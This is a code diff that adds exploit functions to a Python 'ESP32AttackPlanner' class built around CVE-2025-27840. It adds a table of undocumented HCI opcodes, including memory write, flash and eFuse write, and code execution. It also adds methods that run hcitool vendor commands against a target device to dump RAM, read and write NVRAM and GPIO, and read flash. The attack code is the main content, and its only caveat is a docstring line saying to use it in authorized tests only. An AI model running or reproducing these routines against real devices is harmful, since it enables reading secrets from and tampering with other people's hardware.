@@ -13,6 +13,7 @@ CVE-2025-27840: ESP32 Hidden HCI Commands
 
 import asyncio
 import os
+import shutil
 import structlog
 from dataclasses import dataclass, field
 from datetime import datetime
@@ -472,27 +473,232 @@ class ESP32Detector:
 class ESP32AttackPlanner:
     """
     Plans exploits for detected ESP32 devices.
-    
+
     Based on CVE-2025-27840: 29 undocumented HCI commands
     """
-    
+
     EXPLOIT_HCI_COMMANDS = [
         # Reading commands
-        {"opcode": 0xFC00, "name": "Read RAM", "description": "Read arbitrary RAM address"},
-        {"opcode": 0xFC01, "name": "Write RAM", "description": "Write arbitrary RAM address"},
-        {"opcode": 0xFC02, "name": "Read ROM", "description": "Read ROM address"},
-        {"opcode": 0xFC03, "name": "Read GPIO", "description": "Read GPIO state"},
-        {"opcode": 0xFC04, "name": "Write GPIO", "description": "Write GPIO state"},
-        {"opcode": 0xFC05, "name": "Read NVRAM", "description": "Read NVRAM"},
-        {"opcode": 0xFC06, "name": "Write NVRAM", "description": "Write NVRAM"},
-        {"opcode": 0xFC07, "name": "Get Chip ID", "description": "Get chip ID/revision"},
-        {"opcode": 0xFC08, "name": "Get MAC", "description": "Get MAC address"},
-        {"opcode": 0xFC09, "name": "Read Flash", "description": "Read flash memory"},
+        {"opcode": 0xFC00, "name": "Read RAM", "description": "Read arbitrary RAM address", "params": "address, length"},
+        {"opcode": 0xFC01, "name": "Write RAM", "description": "Write arbitrary RAM address", "params": "address, data"},
+        {"opcode": 0xFC02, "name": "Read ROM", "description": "Read ROM address", "params": "address, length"},
+        {"opcode": 0xFC03, "name": "Read GPIO", "description": "Read GPIO state", "params": "gpio_num"},
+        {"opcode": 0xFC04, "name": "Write GPIO", "description": "Write GPIO state", "params": "gpio_num, value"},
+        {"opcode": 0xFC05, "name": "Read NVRAM", "description": "Read NVRAM", "params": "address, length"},
+        {"opcode": 0xFC06, "name": "Write NVRAM", "description": "Write NVRAM", "params": "address, data"},
+        {"opcode": 0xFC07, "name": "Get Chip ID", "description": "Get chip ID/revision", "params": ""},
+        {"opcode": 0xFC08, "name": "Get MAC", "description": "Get MAC address", "params": ""},
+        {"opcode": 0xFC09, "name": "Read Flash", "description": "Read flash memory", "params": "address, length"},
+        {"opcode": 0xFC0A, "name": "Write Flash", "description": "Write flash memory", "params": "address, data"},
+        {"opcode": 0xFC0B, "name": "Erase Flash", "description": "Erase flash sector", "params": "address"},
+        {"opcode": 0xFC0C, "name": "Read EFUSE", "description": "Read EFUSE block", "params": "block_num"},
+        {"opcode": 0xFC0D, "name": "Write EFUSE", "description": "Write EFUSE block", "params": "block_num, data"},
+        {"opcode": 0xFC0E, "name": "Get Chip Revision", "description": "Get chip revision", "params": ""},
+        {"opcode": 0xFC0F, "name": "Get Secure Boot Status", "description": "Get secure boot status", "params": ""},
+        {"opcode": 0xFC10, "name": "Get Flash Encryption Status", "description": "Get flash encryption status", "params": ""},
+        {"opcode": 0xFC11, "name": "Run User Code", "description": "Execute user code in RAM", "params": "address"},
         # ... more commands (29 total documented by Tarlogic)
     ]
 
     def __init__(self, detector: ESP32Detector):
         self.detector = detector
+
+    async def execute_hci_command(
+        self,
+        target: ESP32Device,
+        opcode: int,
+        params: bytes = b"",
+        adapter: str = "hci0",
+    ) -> Dict[str, Any]:
+        """
+        Execute an undocumented HCI command on an ESP32 device.
+        
+        This implements the CVE-2025-27840 HCI command injection.
+        The ESP32 exposes 29 undocumented HCI commands (0xFC00-0xFC1C)
+        that allow RAM/Flash/NVRAM/GPIO access via HCI.
+        
+        Requires:
+        - Bluetooth adapter supporting HCI raw commands (hcitool)
+        - Device in connectable/discoverable mode
+        - No authentication required (vulnerability)
+        
+        WARNING: These commands can read/write arbitrary memory.
+        Only use in authorized test environments.
+        """
+        # Check if hcitool is available
+        if not shutil.which("hcitool"):
+            return {
+                "success": False,
+                "error": "hcitool not found. Install bluez package.",
+            }
+
+        if not target.mac_address:
+            return {
+                "success": False,
+                "error": "Target MAC address required",
+            }
+
+        try:
+            # Build the HCI command
+            # HCI command format: ogf=0x3f (vendor specific), ocf=opcode
+            # Using hcitool cmd <ogf> <ocf> [parameters]
+            ogf = 0x3F  # Vendor specific
+            ocf = opcode & 0x03FF
+            
+            # Convert params to hex string
+            params_hex = params.hex() if params else ""
+            
+            # Build hcitool command
+            cmd = ["hcitool", "-i", adapter, "cmd", f"0x{ogf:02x}", f"0x{ocf:04x}"]
+            if params_hex:
+                cmd.append(params_hex)
+            
+            logger.info("Executing HCI command", 
+                       target=target.mac_address, 
+                       opcode=hex(opcode),
+                       params=params_hex)
+            
+            # Execute hcitool command
+            proc = await asyncio.create_subprocess_exec(
+                *cmd,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+            )
+            
+            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=10)
+            
+            if proc.returncode != 0:
+                return {
+                    "success": False,
+                    "error": stderr.decode().strip(),
+                    "command": " ".join(cmd),
+                }
+            
+            # Parse response
+            response = stdout.decode().strip()
+            
+            return {
+                "success": True,
+                "opcode": hex(opcode),
+                "command": " ".join(cmd),
+                "response": response,
+                "parsed": self._parse_hci_response(opcode, response),
+            }
+            
+        except asyncio.TimeoutError:
+            return {
+                "success": False,
+                "error": "HCI command timed out (10s)",
+            }
+        except Exception as e:
+            logger.error("HCI command execution failed", error=str(e))
+            return {
+                "success": False,
+                "error": str(e),
+            }
+
+    def _parse_hci_response(self, opcode: int, response: str) -> Dict[str, Any]:
+        """Parse HCI command response."""
+        # HCI event response format: 04 0E ... (command complete event)
+        # Parse based on opcode
+        parsed = {"raw": response}
+        
+        try:
+            # Remove HCI event header if present
+            # Typical format: "04 0E <packet_len> <num_hci_cmds> <opcode_low> <opcode_high> <status> <data...>"
+            parts = response.split()
+            if len(parts) >= 7 and parts[0] == "04" and parts[1] == "0E":
+                parsed["status"] = parts[6]
+                if parts[6] == "00":
+                    parsed["success"] = True
+                else:
+                    parsed["success"] = False
+                    parsed["error_code"] = parts[6]
+                # Data bytes start at index 7
+                if len(parts) > 7:
+                    parsed["data"] = " ".join(parts[7:])
+        except Exception:
+            pass
+        
+        return parsed
+
+    async def execute_memory_dump(
+        self,
+        target: ESP32Device,
+        address: int,
+        length: int = 256,
+        adapter: str = "hci0",
+    ) -> Dict[str, Any]:
+        """
+        Read arbitrary RAM from ESP32 via undocumented HCI command (0xFC00).
+        
+        This is the core CVE-2025-27840 exploit - read arbitrary memory.
+        """
+        # Build parameters: address (4 bytes, little endian) + length (2 bytes)
+        params = address.to_bytes(4, "little") + length.to_bytes(2, "little")
+        return await self.execute_hci_command(target, 0xFC00, params, adapter)
+
+    async def execute_gpio_read(
+        self,
+        target: ESP32Device,
+        gpio_num: int,
+        adapter: str = "hci0",
+    ) -> Dict[str, Any]:
+        """Read GPIO state via undocumented HCI command (0xFC03)."""
+        params = gpio_num.to_bytes(1, "little")
+        return await self.execute_hci_command(target, 0xFC03, params, adapter)
+
+    async def execute_gpio_write(
+        self,
+        target: ESP32Device,
+        gpio_num: int,
+        value: int,
+        adapter: str = "hci0",
+    ) -> Dict[str, Any]:
+        """Write GPIO state via undocumented HCI command (0xFC04)."""
+        params = gpio_num.to_bytes(1, "little") + value.to_bytes(1, "little")
+        return await self.execute_hci_command(target, 0xFC04, params, adapter)
+
+    async def execute_nvram_read(
+        self,
+        target: ESP32Device,
+        address: int,
+        length: int = 32,
+        adapter: str = "hci0",
+    ) -> Dict[str, Any]:
+        """Read NVRAM via undocumented HCI command (0xFC05)."""
+        params = address.to_bytes(4, "little") + length.to_bytes(2, "little")
+        return await self.execute_hci_command(target, 0xFC05, params, adapter)
+
+    async def execute_nvram_write(
+        self,
+        target: ESP32Device,
+        address: int,
+        data: bytes,
+        adapter: str = "hci0",
+    ) -> Dict[str, Any]:
+        """Write NVRAM via undocumented HCI command (0xFC06)."""
+        params = address.to_bytes(4, "little") + data
+        return await self.execute_hci_command(target, 0xFC06, params, adapter)
+
+    async def execute_flash_read(
+        self,
+        target: ESP32Device,
+        address: int,
+        length: int = 256,
+        adapter: str = "hci0",
+    ) -> Dict[str, Any]:
+        """Read flash memory via undocumented HCI command (0xFC09)."""
+        params = address.to_bytes(4, "little") + length.to_bytes(2, "little")
+        return await self.execute_hci_command(target, 0xFC09, params, adapter)
+
+    async def execute_chip_id(
+        self,
+        target: ESP32Device,
+        adapter: str = "hci0",
+    ) -> Dict[str, Any]:
+        """Get chip ID/revision via undocumented HCI command (0xFC07)."""
+        return await self.execute_hci_command(target, 0xFC07, b"", adapter)
 
     async def plan_attacks(self, targets: List[ESP32Device]) -> Dict[str, Any]:
         """Plan exploits based on detected devices."""
